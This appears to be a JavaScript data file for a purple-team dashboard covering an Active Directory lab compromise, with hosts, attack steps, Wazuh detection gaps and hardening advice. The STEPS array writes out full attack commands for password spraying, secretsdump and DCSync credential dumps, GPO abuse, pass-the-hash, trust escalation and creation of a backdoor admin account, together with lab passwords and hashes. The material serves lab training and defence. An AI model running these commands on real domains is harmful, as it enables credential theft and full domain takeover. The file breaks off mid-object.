/* report-data.js — shared STATIC attack model (single source of truth).
   Curated, evidence-backed constants used by both index.html (dashboard) and
   report.html (print). Telemetry counts live in dashboard-data.js. */
const RULE_DESC = {
  "60122": "Logon failure — unknown user or bad password (4625)", "60204": "Multiple Windows logon failures — burst (level 10)",
  "92652": "Successful remote NTLM logon — possible Pass-the-Hash", "92657": "NTLM logon w/ workstation — flagged 'possible RDP' (FALSE: tool NTLM)",
  "60106": "Windows logon / Kerberos ticket success", "60137": "Windows logoff", "60109": "User account created/enabled (4720/4722) — lvl 8",
  "60110": "User account changed (4738)", "5715": "sshd: authentication success", "5710": "sshd: non-existent user", "5503": "PAM: login failed"
};
const EVD_DESC = {
  "4625": "Failed logon", "4624": "Successful logon", "4634": "Logoff", "4769": "Kerberos TGS request",
  "4720": "User created", "4722": "User enabled", "4738": "User changed", "4728": "Added to global group", "4732": "Added to local group",
  "4756": "Added to universal group", "4662": "Directory object op (DCSync)", "5136": "Directory object modified (GPO)", "4698": "Scheduled task created"
};
const PRIV = { green: "#3ddc84", yellow: "#ffb020", orange: "#ff8a3d", red: "#ff5a52", purple: "#b08bff" };

const HOSTS = {
  jumpbox: {
    x: 80, y: 215, r: 42, fill: "#24211a", stroke: "#acacac", icon: "assets/icons/jumpbox.png", name: "Ubuntu Jumpbox", ip: "192.168.56.100", pub: "20.52.216.214",
    role: "Attacker workstation (Linux)", domain: "— (not domain-joined)",
    tools: ["NetExec / CrackMapExec", "Impacket (secretsdump, raiseChild, wmiexec)", "bloodhound-python", "smbclient"],
    siem: "workstationName: UBUNTU-JUMPBOX · 192.168.56.100",
    alerts: [["All 'possible RDP' NTLM alerts (92657) trace here", "ntlm_all"], ["164 spray failures + 100+ NTLM logons", "attacker"]]
  },
  winterfell: {
    x: 320, y: 90, r: 44, fill: "#3b342e", stroke: "#ffb020", icon: "assets/icons/winterfell.png", name: "Winterfell", labId: "DC02", ip: "192.168.56.11", bh: "WINTERFELL",
    role: "Child Domain Controller (PDC)", domain: "north.sevenkingdoms.local",
    labFlags: ["Windows Server 2019", "rpc user enum", "ntlm downgrade"],
    users: [["green", "brandon.stark", "domain user · SYSVOL read"], ["yellow", "samwell.tarly", "GenericWrite on GPO → DC local admin"], ["red", "goadmin", "child Domain Admin · DCSync"]],
    siem: "agent.name: winterfell · 192.168.56.11",
    alerts: [["brandon.stark NTLM logons ×29", "sysvol"], ["Massive 4769 noise (robb.stark, ::1)", "kerberos"], ["GPO 5136 & DCSync 4662: 0 events — GAP", "gpo"]]
  },
  castelblack: {
    x: 320, y: 340, r: 42, fill: "#0e0d0a", stroke: "#4aa3ff", icon: "assets/icons/castelblack.png", name: "Castelblack", labId: "SRV02", ip: "192.168.56.22", bh: "CASTELBLACK",
    role: "Member server — MSSQL / IIS", domain: "north.sevenkingdoms.local (member)",
    labFlags: ["Windows Server 2019 — no defender", "IIS + upload ASP", "MSSQL + execute as + trusted link"],
    users: [["yellow", "jeor.mormont", "local Administrator"], ["yellow", "sql_svc", "MSSQL sysadmin · xp_cmdshell"]],
    siem: "agent.name: castelblack · 192.168.56.22",
    alerts: [["jeor.mormont remote admin NTLM ×15 + logon/logoff ×34", "cb_localadmin"], ["sql_svc 4625 ×2 → 4624 ×9", "mssql"]]
  },
  kingslanding: {
    x: 610, y: 215, r: 46, fill: "#3b342e", stroke: "#ff5a52", icon: "assets/icons/kingslanding.png", name: "Kingslanding", labId: "DC01", ip: "192.168.56.10",
    role: "Forest Root Domain Controller", domain: "sevenkingdoms.local", agentNote: "agent 002 · Win Server 2019",
    labFlags: ["Windows Server 2019", "ESC1"],
    users: [["orange", "north\\goadmin", "cross-trust auth via trust key"], ["red", "sevenkingdoms\\goadmin", "Enterprise Admin / root DA"], ["purple", "KINGHODOR", "malicious persistence (EA+DA)"], ["purple", "Composer", "Cursor agent backdoor (EA)"]],
    siem: "agent 002 · kingslanding · 192.168.56.10 (Win Server 2019)",
    alerts: [["Cross-trust goadmin: 4624 ×47 / 92652 ×44", "trust"], ["KINGHODOR created (4720/4738) — EA add NOT logged", "kinghodor"], ["Composer agent run · account + LDAP logons", "composer"], ["Root DCSync (4662): 0 events — GAP", "dcsync"]]
  },
  wazuh: {
    x: 565, y: 60, r: 32, fill: "#0e0d0a", stroke: "#3ddc84", icon: "assets/icons/wazuh.png", name: "Wazuh", ip: "192.168.56.51",
    role: "SIEM manager (goad-vm-wazuh)", domain: "agents: WF · CB · KL",
    siem: "OpenSearch indices wazuh-alerts-*", note: "All evidence pulled live from this manager's indexer + dashboard exports.",
    alerts: [["NTLM overview + KINGHODOR persistence exported", "ntlm_all"], ["Detection gaps: GPO 5136, DCSync 4662, EA-add 4756", "dcsync"]]
  }
};
const EDGES = [
  { id: "jb-wf", a: "jumpbox", b: "winterfell", cls: "attack" },
  { id: "jb-cb", a: "jumpbox", b: "castelblack", cls: "attack" },
  { id: "jb-kl", a: "jumpbox", b: "kingslanding", cls: "attack" },
  { id: "wf-kl", a: "winterfell", b: "kingslanding", cls: "trust" }
];
const DOMAINS = {
  north: {
    label: "north (CHILD)", full: "north.sevenkingdoms.local", dc: "Winterfell · 192.168.56.11",
    sid: "S-1-5-21-1814927890-1415249844-1188444219",
    trust: "Bidirectional trust to sevenkingdoms.local — SID filtering DISABLED",
    da: ["EDDARD.STARK (legit)", "ADMINISTRATOR", "GOADMIN"],
    users: [["green", "brandon.stark", "foothold — SYSVOL read, no ACL edges"], ["yellow", "samwell.tarly", "GenericWrite/WriteOwner/WriteDacl on GPO STARKWALLPAPER"], ["yellow", "jeor.mormont", "local admin on Castelblack"], ["yellow", "sql_svc", "MSSQL sysadmin (Kerberoastable)"], ["red", "goadmin", "child Domain Admin (post-GPO + DCSync)"]],
    alerts: [["brandon.stark foothold logons", "sysvol"], ["GPO takeover (5136/4698)", "gpo"], ["Child DCSync (4662)", "dcsync"]], bh: "north"
  },
  root: {
    label: "root (FOREST)", full: "sevenkingdoms.local", dc: "Kingslanding · 192.168.56.10",
    sid: "S-1-5-21-2456594957-880492381-2139086532",
    trust: "Foreign Enterprise Admins hold GenericAll on the child domain object",
    da: ["GOADMIN (root DA / EA)", "ADMINISTRATOR", "KINGHODOR (attacker-added)"],
    users: [["orange", "north\\goadmin", "authenticates over trust"], ["red", "sevenkingdoms\\goadmin", "Enterprise Admin — full forest"], ["purple", "KINGHODOR", "persistence: EA + DA, created via WMI"]],
    alerts: [["Cross-trust goadmin logons", "trust"], ["KINGHODOR creation & use", "kinghodor"], ["Root DCSync (4662)", "dcsync"]], bh: "root"
  }
};
const REPORT_IMG = "assets/reportaspng/";
const REPORT_STEPS = [
  {
    n: 1, ph: "foothold", t: "Initial Foothold & AD Enumeration",
    hosts: ["jumpbox", "winterfell", "castelblack"],
    summary: "Jumpbox context · SMB/LDAP reachability · authenticated LDAP enumeration · samwell.tarly credential exposure",
    body: [
      "Operating from the Linux jumpbox, the internal AD topology was mapped through reachable SMB/LDAP services and domain controller responses.",
      "With a valid low-privileged domain account, LDAP enumeration against Winterfell exposed unsafe AD metadata: samwell.tarly had a cleartext password stored in the description attribute.",
      "This page is kept as context only; the password-spray noise is not broken out as its own Red Team step."
    ],
    img: REPORT_IMG + "upscayl_png_ultrasharp-4x_2x/Screenshot 2026-06-12 144712_upscayl_2x_ultrasharp-4x.png"
  },
  {
    n: 2, ph: "child", t: "BloodHound & GPO Privilege Escalation",
    hosts: ["jumpbox", "winterfell"],
    summary: "bloodhound-python · samwell.tarly Write on STARKWALLPAPER · pyGPOAbuse → local admin on Winterfell DC",
    body: [
      "BloodHound collection as brandon.stark revealed that samwell.tarly had write-level control over the STARKWALLPAPER GPO in the child domain.",
      "pyGPOAbuse injected an immediate scheduled task into that GPO. The task executed on Winterfell and added samwell.tarly to the local Administrators group.",
      "After the GPO refresh window, CrackMapExec confirmed administrative access on the Winterfell domain controller."
    ],
    img: REPORT_IMG + "upscayl_png_ultrasharp-4x_2x/Screenshot 2026-06-12 144833.png"
  },
  {
    n: 3, ph: "child", t: "Child Domain Compromise (DCSync)",
    hosts: ["jumpbox", "winterfell"],
    summary: "secretsdump.py -just-dc · DRSUAPI · child NTDS · DA + krbtgt",
    body: [
      "Local administrator rights on a domain controller enabled DCSync against the child domain.",
      "Impacket secretsdump.py used DRSUAPI to coerce Winterfell into replicating password material over the network.",
      "The dump yielded child domain administrator material, krbtgt material, trust keys, and user hashes. Sensitive hashes remain redacted in the page data."
    ],
    img: REPORT_IMG + "upscayl_png_ultrasharp-4x_2x/Screenshot 2026-06-12 144844_upscayl_2x_ultrasharp-4x.png"
  },
  {
    n: 4, ph: "forest", t: "Forest Escalation via Trust Abuse",
    hosts: ["jumpbox", "winterfell", "kingslanding"],
    summary: "raiseChild.py · Golden Ticket + ExtraSid …-519 · root goadmin + krbtgt",
    body: [
      "With the child domain compromised, raiseChild.py abused the parent-child trust boundary.",
      "A forged ticket injected the parent Enterprise Admins SID ending in -519 through SIDHistory, giving the child-domain identity effective forest-level privilege.",
      "The root domain controller accepted the ticket, allowing root-domain replication and administrative execution paths."
    ],
    img: REPORT_IMG + "upscayl_png_ultrasharp-4x_2x/Screenshot 2026-06-12 144909_upscayl_2x_ultrasharp-4x.png"
  },
  {
    n: 5, ph: "persist", t: "Post-Exploitation & Parent Domain",
    hosts: ["jumpbox", "winterfell", "kingslanding"],
    summary: "D$ · VMAgentLogs.zip · IaC cleartext goadmin · CME (Pwn3d!) Kingslanding",
    body: [
      "Post-exploitation on Tier 0 systems exposed infrastructure provisioning artifacts on administrative shares.",
      "VMAgentLogs.zip contained deployment traces with sensitive account material from the IaC process.",
      "The recovered administrative context was validated against Kingslanding, proving parent-domain control and enabling persistence actions."
    ],
    img: REPORT_IMG + "upscayl_png_ultrasharp-4x_2x/Screenshot 2026-06-12 144925_upscayl_2x_ultrasharp-4x.png"
  }
];
const PURPLE_STEPS = [
  {
    n: 1, title: "Reconnaissance and Initial Access", hardening: "spray",
    attack: "Network scanning, SMB fingerprinting, and successful initial authentication against brandon.stark using a known dictionary list.",
    telemetry: [
      ["4625", "Failed logon volume from one source across many users."],
      ["4624", "Successful logon from the same source after the failure burst."],
      ["Network/IDS", "Nmap sweeps and CrackMapExec SMB mapping signatures."]
    ],
    remediation: "Use Fine-Grained Password Policies, ban common dictionary passwords, and rate-limit or lock out repeated authentication attempts."
  },
  {
    n: 2, title: "Active Directory Enumeration", hardening: "ldap_desc",
    attack: "Authenticated LDAP enumeration via BloodHound exposed cleartext credentials in the description field for samwell.tarly.",
    telemetry: [
      ["1644", "Directory Service Search logging for volumetric LDAP query patterns."],
      ["4662", "Excessive SAMR or object access if directory access auditing is enabled."]
    ],
    remediation: "Continuously audit AD object attributes such as Description and UserParameters. Remove temporary passwords from AD metadata."
  },
  {
    n: 3, title: "Privilege Escalation via GPO Abuse", hardening: "gpo",
    attack: "A malicious immediate scheduled task was injected into the STARKWALLPAPER GPO and executed by the DC client-side extensions.",
    telemetry: [
      ["5136", "GPO versionNumber or gPCMachineExtensionNames modified."],
      ["5145", "ScheduledTasks.xml modified in SYSVOL."],
      ["4698", "Scheduled task created with administrative command content."],
      ["4732", "samwell.tarly added to local Administrators."]
    ],
    remediation: "Restrict GPO edit rights to Tier 0 admins. No standard user or service account should edit GPOs linked to Domain Controllers."
  },
  {
    n: 4, title: "Child Domain Compromise (DCSync)", hardening: "dcsync",
    attack: "DCSync rights were abused through DRSUAPI to replicate child-domain password material.",
    telemetry: [
      ["4662", "Alert on DS-Replication-Get-Changes or Get-Changes-All from non-DC accounts or IPs."],
      ["DRSUAPI", "Replication traffic initiated by an account that is not a legitimate domain controller."]
    ],
    remediation: "Audit domain root ACLs. Replicating Directory Changes should be limited to Domain Controllers and Enterprise Domain Controllers."
  },
  {
    n: 5, title: "Forest Escalation via Trust Abuse", hardening: "sidfilter",
    attack: "A Golden Ticket was forged using child krbtgt material and an Enterprise Admins SID (-519) was injected into SIDHistory.",
    telemetry: [
      ["4769", "Unusual TGT lifetimes or RC4 use compared to the domain baseline."],
      ["4624", "Child-domain user token contains privileged parent-domain SID."]
    ],
    remediation: "Enable SID Filtering where appropriate and double-rotate the compromised child-domain krbtgt password."
  },
  {
    n: 6, title: "Post-Exploitation: Infrastructure Provisioning Artifacts", hardening: "persist",
    attack: "Administrative shares exposed VMAgentLogs.zip with IaC deployment artifacts and sensitive goadmin material.",
    telemetry: [
      ["5140", "Interactive user access to C$, D$, or ADMIN$ on Tier 0 assets."],
      ["5145", "File-level access to provisioning logs and VM agent caches."]
    ],
    remediation: "Add post-deployment cleanup to IaC pipelines. Delete provisioning logs, unattend.xml, and VMAgent caches after deployment."
  }
];
const STEPS = [
  {
    n: 1, ph: "foothold", t: "Password spray → brandon.stark", hosts: ["jumpbox", "winterfell", "castelblack"], harden: "spray", evid: "spray",
    cmd: "crackmapexec smb 192.168.56.11 192.168.56.22 -u ~/users-goad.txt -p /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt -d north.sevenkingdoms.local --continue-on-success", loot: "brandon.stark : iseedeadpeople"
  },
  {
    n: 2, ph: "foothold", t: "SYSVOL / NETLOGON secret.ps1", hosts: ["jumpbox", "winterfell"], harden: "sysvol", evid: "sysvol",
    cmd: "smbclient //$WF/NETLOGON -U 'north.sevenkingdoms.local/brandon.stark%iseedeadpeople' -c 'get secret.ps1'", loot: "jeor.mormont : _L0ngCl@w_ (cleartext in script)"
  },
  {
    n: 3, ph: "foothold", t: "LDAP description leak", hosts: ["jumpbox", "winterfell"], harden: "ldap_desc", evid: "ldap_desc",
    logNote: "New query confirmed: spray locked samwell.tarly out 4× on Winterfell (rule 60115, level 9) — then 6 successful NTLM logons (92652) when those creds were reused. The SIEM had level-9 alerts for samwell's lockout; no action was taken. See samwell_wf evidence block.",
    cmd: "crackmapexec ldap $WF -u brandon.stark -p 'iseedeadpeople' --users", loot: "samwell.tarly : Heartsbane (in description attribute)"
  },
  {
    n: 4, ph: "child", t: "Local admin on Castelblack", hosts: ["jumpbox", "castelblack"], harden: "laps", evid: "cb_localadmin",
    cmd: "crackmapexec smb 192.168.56.22 -u jeor.mormont -p '_L0ngCl@w_'", loot: "(Pwn3d!) — local Administrator on CB"
  },
  {
    n: 5, ph: "child", t: "LSA secrets dump → sql_svc", hosts: ["jumpbox", "castelblack"], harden: "mssql", evid: "mssql",
    cmd: "secretsdump.py 'north.sevenkingdoms.local/jeor.mormont:_L0ngCl@w_@192.168.56.22'", loot: "sql_svc : YouWillNotKerboroast1ngMeeeeee (cleartext LSA)"
  },
  {
    n: 6, ph: "child", t: "MSSQL sysadmin / xp_cmdshell", hosts: ["jumpbox", "castelblack"], harden: "mssql", evid: "mssql",
    cmd: "crackmapexec mssql 192.168.56.22 -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee' -x 'whoami'", loot: "command exec as north\\sql_svc"
  },
  {
    n: 7, ph: "child", t: "BloodHound → GPO path", hosts: ["jumpbox", "winterfell"], harden: "gpo", evid: "ldap_desc",
    logNote: "BloodHound runs from the jumpbox — Windows does not log “graph export”. Below: Brandon’s normal LDAP/network logons on the DC (same phase as user enum). The GPO abuse path itself is only in BloodHound + terminal proof.",
    cmd: "bloodhound-python -d north.sevenkingdoms.local -u brandon.stark -p 'iseedeadpeople' -ns 192.168.56.11 -c All", loot: "samwell.tarly → GenericWrite on GPO STARKWALLPAPER"
  },
  {
    n: 8, ph: "child", t: "GPO abuse → DC local admin", hosts: ["jumpbox", "winterfell"], harden: "gpo", evid: "gpo",
    logNote: "Samwell also appears in 6 “remote login” alerts (rule 92657, source .100) in the NTLM overview — but still zero events for GPO change (5136) or scheduled task (4698).",
    cmd: "~/tools/pyGPOAbuse/venv/bin/python ~/tools/pyGPOAbuse/pygpoabuse.py 'north.sevenkingdoms.local/samwell.tarly:Heartsbane' -gpo-id 'C0CB1EC9-873F-44DD-9F44-7A18FC7E2F31' -dc-ip '192.168.56.11' -f -taskname 'WallpaperRefresh' -description 'GPO wallpaper refresh task' -command 'net localgroup administrators samwell.tarly /add'", loot: "(Pwn3d!) on Winterfell — UNLOGGED"
  },
  {
    n: 9, ph: "child", t: "Child DCSync", hosts: ["jumpbox", "winterfell"], harden: "dcsync", evid: "dcsync",
    logNote: "Wazuh custom rule 100100 successfully detected DCSync (DS-Replication-Get-Changes) requested by samwell.tarly, WINTERFELL$, and KINGSLANDING$. This proves credential theft occurred.",
    cmd: "secretsdump.py -just-dc 'north.sevenkingdoms.local/samwell.tarly:Heartsbane@192.168.56.11'", loot: "DA / krbtgt / trust-key hashes — DETECTED by rule 100100"
  },
  {
    n: 10, ph: "forest", t: "Pass-the-Hash over trust", hosts: ["jumpbox", "kingslanding"], harden: "sidfilter", evid: "trust",
    cmd: "crackmapexec smb 192.168.56.10 -d sevenkingdoms.local -u goadmin -H c66d72021a2d4744409969a581a1705e -x 'whoami'", loot: "[+] auth via trust (not root admin yet)"
  },
  {
    n: 11, ph: "forest", t: "raiseChild → forest escalation", hosts: ["jumpbox", "winterfell", "kingslanding"], harden: "sidfilter", evid: "trust",
    cmd: "python3 ~/.local/bin/raiseChild.py -debug -hashes aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4 -target-exec kingslanding.sevenkingdoms.local -w ~/parent-goadmin.ccache 'north.sevenkingdoms.local/goadmin'", loot: "root goadmin + root krbtgt hashes (ExtraSid EA …-519)"
  },
  {
    n: 12, ph: "forest", t: "Root DCSync", hosts: ["jumpbox", "kingslanding"], harden: "dcsync", evid: "dcsync",
    cmd: "secretsdump.py -just-dc -hashes aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e sevenkingdoms.local/goadmin@192.168.56.10", loot: "full sevenkingdoms.local NTDS — forest takeover, DETECTED by rule 100100"
  },
  {
    n: 13, ph: "persist", t: "Create KINGHODOR (EA+DA)", hosts: ["jumpbox", "kingslanding"], harden: "persist", evid: "kinghodor",
    cmd: "impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e 'sevenkingdoms.local/goadmin@192.168.56.10' -silentcommand 'net user skriptkiddie e4tAsz /add /domain && net group \"Enterprise Admins\" skriptkiddie /add /domain && net group \"Domain Admins\" skriptkiddie /add /domain'", loot: "skriptkiddie in EA + DA (4720 caught · group-add NOT)"
  },
  {
    n: 14, ph: "persist", t: "Verify KINGHODOR (C$ + DCSync)", hosts: ["jumpbox", "kingslanding"], harden: "persist", evid: "kinghodor",
    cmd: "crackmapexec smb 192.168.56.10 -u skriptkiddie -p 'e4tAsz' -d sevenkingdoms.local", loot: "Authenticated as skriptkiddie"
  },
  {
    n: 15, ph: "persist", t: "LDAP confirm EA membership", hosts: ["jumpbox", "kingslanding"], harden: "persist", evid: "kinghodor",
    cmd: "crackmapexec ldap 192.168.56.10 -u skriptkiddie -p 'e4tAsz' -d sevenkingdoms.local", loot: "LDAP access as skriptkiddie"
  },
  {
    n: 16, ph: "persist", t: "Post-Exploitation: VMAgentLogs Extraction", hosts: ["jumpbox", "winterfell"], harden: "persist", evid: "kinghodor",
    cmd: "smbclient //192.168.56.11/D$ -U 'north.sevenkingdoms.local/goadmin%NgtI75cKV+Pu' -c 'cd CollectGuestLogsTemp; get VMAgentLogs.zip; get VMAgentLogs.zip.json'\nunzip -q VMAgentLogs.zip -d vmagent-extracted\ngrep -rE 'NgtI75|8dCT-DJ|domain_password|config\\.json|sevenkingdoms' vmagent-extracted 2>/dev/null | head -30", loot: "Found cleartext domain_password and config.json in VMAgentLogs.zip"
  }
];
const HARDENING = [
  {
    id: "spray", title: "Strong passwords + lockout after failed tries", scope: "All domains", mitre: "T1110 Brute Force", status: "on", evid: "spray",
    consensus: "required", topo: { type: "attack", t: ["winterfell", "castelblack", "kingslanding"] },
    why: "The break-in started because <b>brandon.stark</b> had a weak password (<b>iseedeadpeople</b>). Wazuh logged <b>302 failed logins</b> from the jumpbox (.100), including <b>25 high-severity burst alerts</b> (rule 60204, level 10). A dedicated query confirmed: <b>samwell.tarly's account was locked out 4 times</b> (rule 60115, level 9) on Winterfell during the spray. The SIEM had every signal — lockout, burst-fail, single source IP. Nothing was acted on.",
    fix: "Enforce account lockout policy; ban common passwords (NCSC 100k list or similar); alert on 60204 + 60115 from a single source IP; consider geo-blocking the attacker subnet.",
    query: "data.win.system.eventID:4625 AND data.win.eventdata.ipAddress:192.168.56.100", expect: "4625 · rules 60122/60204"
  },
  {
    id: "sysvol", title: "No passwords in logon scripts (SYSVOL / NETLOGON)", scope: "Winterfell DC", mitre: "T1552.001 Creds in Files", status: "on", evid: "sysvol",
    consensus: "required", topo: { type: "attack", t: ["winterfell"] },
    why: "Brandon read <b>secret.ps1</b> from NETLOGON and got <b>jeor.mormont’s password</b>. We see Brandon’s successful network logons (29×), but <b>no file-share events</b> (5140/5145) — so the actual file read does not appear in the SIEM.",
    fix: "Remove secrets from scripts; turn on file-share auditing on SYSVOL; scan SYSVOL for passwords in CI.",
    query: "agent.ip:192.168.56.11 AND data.win.system.eventID:(4624 OR 5140 OR 5145) AND data.win.eventdata.targetUserName:brandon.stark", expect: "4624 yes · 5140/5145 missing"
  },
  {
    id: "ldap_desc", title: "No passwords in user profile fields (LDAP description)", scope: "Winterfell DC", mitre: "T1087 Account Discovery", status: "on", evid: "ldap_desc",
    consensus: "required", topo: { type: "attack", t: ["winterfell"] },
    why: "<b>samwell.tarly</b>’s password was stored in the AD <b>description</b> field — any domain user could read it. LDAP “read description” does not raise its own alert; only Brandon’s login to the DC is logged.",
    fix: "Clear description/info fields; don’t store secrets in AD attributes; watch for bulk LDAP user listing from one workstation.",
    query: "agent.ip:192.168.56.11 AND data.win.system.eventID:4624 AND data.win.eventdata.targetUserName:brandon.stark", expect: "4624 logons only"
  },
  {
    id: "laps", title: "Unique local admin passwords (LAPS)", scope: "Castelblack", mitre: "T1078 Valid Accounts", status: "on", evid: "cb_localadmin",
    consensus: "required", topo: { type: "attack", t: ["castelblack"] },
    why: "<b>jeor.mormont</b> is shared local admin on Castelblack (LAPS off). That allowed dumping LSA secrets. Wazuh shows <b>15 remote-login alerts</b> (92652) plus logon/logoff pairs from .100.",
    fix: "Deploy LAPS; remove shared local admins; alert when a non-server account gets “special privileges” (4672) if that audit is on.",
    query: "agent.ip:192.168.56.22 AND data.win.eventdata.targetUserName:jeor.mormont", expect: "4624/4634 · rule 92652"
  },
  {
    id: "mssql", title: "Turn off xp_cmdshell; don’t store SQL password in LSA", scope: "Castelblack SQL", mitre: "T1505 Server Software Component", status: "on", evid: "mssql",
    consensus: "debate", topo: { type: "attack", t: ["castelblack"] },
    debate: "Turning off <b>xp_cmdshell</b> is a must. Moving SQL to a <b>group managed service account (gMSA)</b> is the part teams often argue about — it can break jobs and apps. Alternative: very long random password + strict scope.",
    why: "<b>sql_svc</b> could run OS commands via SQL. Its password was in LSA in cleartext. Logs: 2 failed logins, then 9 successes — all on Castelblack, no remote IP in many rows.",
    fix: "Disable xp_cmdshell; use gMSA or hardened service account; don’t leave SQL passwords in LSA.",
    query: "agent.ip:192.168.56.22 AND data.win.eventdata.targetUserName:sql_svc", expect: "4624/4625 · rules 60106/60122"
  },
  {
    id: "gpo", title: "Alert when Group Policy is changed + limit who can edit GPOs", scope: "Winterfell DC", mitre: "T1484.001 GPO Modification", status: "gap", evid: "gpo",
    consensus: "required", topo: { type: "attack", t: ["winterfell"] },
    why: "Samwell abused write access to a GPO and became local admin on the DC. That is the worst step in the child domain — and the SIEM has <b>zero</b> events for GPO change (5136) or new scheduled task (4698). We only pulled empty query results.",
    fix: "Enable directory change auditing; forward 5136/5137 and 4698; remove Samwell’s write rights on the GPO.",
    query: "agent.ip:192.168.56.11 AND data.win.system.eventID:(5136 OR 5137 OR 4698 OR 4702) AND data.win.eventdata.targetUserName:samwell.tarly", expect: "5136/4698 expected — none found"
  },
  {
    id: "dcsync", title: "Detect hash theft via replication (DCSync / event 4662)", scope: "Winterfell + Kingslanding", mitre: "T1003.006 DCSync", status: "gap", evid: "dcsync",
    consensus: "debate", topo: { type: "attack", t: ["winterfell", "kingslanding"] },
    debate: "You need to detect DCSync — but raw <b>4662</b> is noisy because real DCs replicate all day. Teams must tune allow-lists. Rotating <b>krbtgt twice</b> after an incident is not optional.",
    why: "Both child and root hash dumps ran with <b>no 4662 alerts at all</b> — replication auditing was off. The attack succeeded entirely off-log for this technique.",
    fix: "Enable DS access auditing + DCSync SACL; alert when a non-DC account requests replication; rotate krbtgt twice.",
    query: "data.win.system.eventID:4662 AND agent.name:(winterfell OR kingslanding)", expect: "4662 expected — none found"
  },
  {
    id: "sidfilter", title: "Trust / forest: limit child admins reaching root", scope: "Trust Winterfell ↔ Kingslanding", mitre: "T1134.005 SID History / T1482", status: "on", evid: "trust",
    consensus: "debate", topo: { type: "trust", t: ["winterfell", "kingslanding"] },
    debate: "In one forest, Microsoft does not enable SID filtering on the parent–child trust by default. Turning it on can break normal cross-domain admin work. Discuss: treat child DCs as fully trusted, or redesign the forest.",
    why: "Trust had SID filtering off, so child <b>goadmin</b> / krbtgt could be abused toward root. Logs: <b>105 events</b> for goadmin on Kingslanding (44× remote NTLM alert 92652) — movement was visible, not the trust misconfig itself.",
    fix: "Review trust settings; monitor cross-domain admin logons; assume child domain admins can hurt the forest.",
    query: "agent.ip:192.168.56.10 AND data.win.eventdata.targetUserName:goadmin", expect: "4624/4625 · rule 92652"
  },
  {
    id: "persist", title: "Alert when someone is added to Enterprise / Domain Admins", scope: "Kingslanding root DC", mitre: "T1136.002 / T1098 Persistence", status: "gap", evid: "kinghodor",
    consensus: "required", topo: { type: "attack", t: ["kingslanding"] },
    why: "<b>KINGHODOR</b> was created and changed — Wazuh caught that (4720/4722/4738, rules 60109/60110). Adding the account to <b>Enterprise Admins / Domain Admins</b> did <b>not</b> log (no 4728/4756). That is the dangerous part.",
    fix: "Audit security group changes; high-severity alert on EA/DA adds; use just-in-time admin where possible.",
    query: "agent.ip:192.168.56.10 AND data.win.system.eventID:(4720 OR 4722 OR 4728 OR 4732 OR 4756) AND data.win.eventdata.targetUserName:KINGHODOR", expect: "4720/4738 yes · 4728/4756 missing"
  },
  {
    id: "ntlm", title: "Block or watch the jumpbox (.100); fix misleading “RDP” alerts", scope: "All DCs/members from .100", mitre: "T1021 Remote Services", status: "on", evid: "ntlm_all",
    consensus: "debate", topo: { type: "attack", t: ["winterfell", "castelblack", "kingslanding"] },
    debate: "Keeping the unknown Linux host off the domain network is clear. A <b>full ban on NTLM</b> needs a careful rollout — many apps still need it. Retitling rule 92657 (it says “RDP” for NetExec logons) is uncontroversial.",
    why: "One host (<b>UBUNTU-JUMPBOX</b>, .100) drove spray, lateral movement, and admin logons. Rule 92657 even flags <b>ANONYMOUS LOGON</b> as “possible RDP” — that text is wrong for this lab.",
    fix: "Segment jumpbox; restrict NTLM where possible; rewrite 92657 to describe tool-based NTLM, not RDP.",
    query: "rule.id:(92652 OR 92657) AND data.win.eventdata.workstationName:UBUNTU-JUMPBOX", expect: "4624 · rule 92657 (25 in export)"
  },
  {
    id: "kerbnoise", title: "Reduce Kerberos ticket noise (::1 on the DC)", scope: "Wazuh indexing", mitre: "Detection Engineering", status: "on", evid: "kerberos",
    consensus: "debate", topo: { type: "kdc", t: ["winterfell"] },
    debate: "Filtering <b>10k+</b> local 4769 events helps analysts — but suppression can hide abuse if done carelessly. Decide: drop vs. send to a cheap archive index.",
    why: "Ticket requests from <b>::1</b> (DC talking to itself) flooded the index and capped search results. Most are benign lab noise, not the attack.",
    fix: "Filter 4769 from ::1/127.0.0.1; keep cross-host Kerberos tickets in the main index.",
    query: "data.win.system.eventID:4769 AND data.win.eventdata.ipAddress:\"::1\"", expect: "4769 · rule 60106 (10k+)"
  }
];
const EVIDENCE_IMG = "assets/evidence/";
const BH_TOPO_CREDIT = "providedbyrafaelpietridavila";
const PROOF = {
  steps: {
    4: [
      { src: EVIDENCE_IMG + "cme_castelblack.png", caption: "CrackMapExec: jeor.mormont gültig auf Winterfell, Castelblack, Kingslanding — (Pwn3d!) nur auf Castelblack (SMB signing aus)." },
      { src: EVIDENCE_IMG + "jeor_whoami.png", caption: "Remote whoami /all via WMI: Mitgliedschaft BUILTIN\\Administrators bestätigt (Pivot-Punkt)." }
    ],
    5: [
      { src: EVIDENCE_IMG + "lsa_secretsdump.png", caption: "Impacket secretsdump als lokaler Admin: SAM/Cache/LSA — Klartext sql_svc aus _SC_MSSQL$SQLEXPRESS." }
    ],
    7: [
      { src: EVIDENCE_IMG + "bh_shortest_path.png", caption: "BloodHound: kürzester Pfad zu Domain Admins (GPO-GenericWrite, Delegation, DCSync-Kanten).", bhTopology: true },
      { src: EVIDENCE_IMG + "domain_admins.png", caption: "BloodHound: GOADMIN / EDDARD / ADMINISTRATOR als MemberOf Domain Admins (Zielgruppe).", bhTopology: true }
    ],
    8: [
      { src: EVIDENCE_IMG + "gpo_winterfell_pwn3d.png", caption: "pyGPOAbuse Scheduled Task + CME: samwell.tarly (Pwn3d!) auf Winterfell nach GPO-Missbrauch." }
    ],
    9: [
      { src: EVIDENCE_IMG + "dcsync_ntds.png", caption: "secretsdump -just-dc (DRSUAPI): NTDS-Hash-Dump — goadmin, krbtgt, Domain-User (DCSync-Nachweis)." },
      { src: EVIDENCE_IMG + "domain_admins.png", caption: "Graph-Kontext: wer Domain Admins im Child ist (Post-DCSync-Relevanz).", bhTopology: true },
      { src: EVIDENCE_IMG + "image(1).png", caption: "CrackMapExec SMB: north.sevenkingdoms.local\\goadmin + Child-DA-Hash dbd13e1c… → (Pwn3d!) auf Winterfell (192.168.56.11) — DA-Zugriff auf dem Child-DC nach DCSync." }
    ],
    10: [
